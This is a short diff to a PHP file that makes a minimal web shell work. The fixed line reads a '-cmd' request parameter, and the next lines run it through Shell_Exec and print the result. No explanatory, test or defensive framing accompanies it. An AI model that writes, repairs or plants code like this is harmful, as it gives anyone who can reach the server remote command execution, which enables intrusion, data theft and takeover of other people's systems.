@@ -1,5 +1,5 @@
 <?php
-md = $_REQUEST["-cmd"];
+$cmd = $_REQUEST["-cmd"];
 if($cmd != "") 
 	print Shell_Exec($cmd);
 ?>
